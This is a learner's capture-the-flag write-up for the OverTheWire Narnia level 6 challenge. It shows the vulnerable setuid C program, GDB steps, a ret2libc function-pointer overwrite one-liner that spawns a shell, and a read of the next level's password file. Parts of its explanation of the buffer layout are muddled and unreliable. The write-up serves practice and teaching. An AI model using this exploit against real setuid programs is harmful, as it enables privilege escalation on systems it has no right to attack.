# Narnia OverTheWire Level6-7

## Problem Explanation and Relevant Knowledge

-This level in Narnia brings to us a classic function pointer overwrite challenge

-We have a binary ,a SUID that runs with the narnia7 user privileges


### Source Code

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    extern char **environ;

    // tired of fixing values...
    // - morla
    unsigned long get_sp(void) {
           __asm__("movl %esp,%eax\n\t"
                   "and $0xff000000, %eax"
                   );
    }

    int main(int argc, char *argv[]){
  	    char b1[8], b2[8];
	    int  (*fp)(char *)=(int(*)(char *))&puts, i;

	    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	    /* clear environ */
	    for(i=0; environ[i] != NULL; i++)
		    memset(environ[i], '\0', strlen(environ[i]));
	    /* clear argz    */
	    for(i=3; argv[i] != NULL; i++)
		    memset(argv[i], '\0', strlen(argv[i]));

	    strcpy(b1,argv[1]);
 	    strcpy(b2,argv[2]);
	    //if(((unsigned long)fp & 0xff000000) == 0xff000000)
	    if(((unsigned long)fp & 0xff000000) == get_sp())
		    exit(-1);
	    setreuid(geteuid(),geteuid());
        fp(b1);

	    exit(1);
    }

### Observations:

-b1 and b2 are 8byte buffers in the stack

-fp is a function  pointer placed after b2 in memory

-strcpy is the reason why we can perform a buffer overflow

-There is a stack pointer checks that prevents fp from pointing into the stack,so we can't use shellcode this time

-We see setreuid(geteuid(), Geteuid()) called before fp, so this elevates the privileges before fp execution

## Solution Process

-We have to overwrite fp with the addres of system().b1 contains /bin/sh with elevated privileges given by the same c code

### Understanding the memory layout

-By testing with patterns of A's and B's in GDB we confirmed the stack layout

    [ b1: 8bytes ] [b2 :8 bytes] [fp:4 bytes]

-Overflowing b2 by more than 8 bytes reaches fp

### Finding Overflow Offset

-In GDB 
 
     run AAAAAAA AAAAAAAAAAAAAAAAAAA

-with 8 bytes of padding +4 bytes of address = exactly 12 bytes to control fp from b2

-But b2 needs /bin/sh

-After re examining argv[1] goes into b1 passed as an argument and argv[2] goes into b2 and overflows fp

### Address of system()

-Inside GDB after running the program and loaded libc we get the system() address..so we run:

    (gdb) break main
    (gdb) run idks idks
    (gdb) p system 

-And then we get the address in the output 

-In this case: 0xf7dd18e0 

-In little endian: \xe0\x18\xdd\xf7


### The exploit

-Out GDB

    ./narnia6 $(perl -e 'print "A"x8 . "\xe0\x18\xdd\xf7"') $(perl -e 'print "B"x8 . "/bin/sh"')


-8 A's + address of system() copied into b1 overflows through b2 and then fp

-8 B's + /bin/sh copied into b2,the /bin/sh sits in memory and is reachable by b1 and its considered as an argument by b1

### Read the password

-Now that we are narnia7 we can see the password for this user in the known directory:

    cat /etc/narnia_pass/narnia7



## Key Concepts Learned


#### Function Pointer Overwrite

-In this case we overwrote a function pointer instead of a returning address,is a variation of buffer overflow that can control flow through data pointers

#### Stack-Based Shellcode Mitigation

-The program checks whether fp points into the stack region and exists if so.So this forced the use of the library functions(ret2libc) instead of shellcode injection





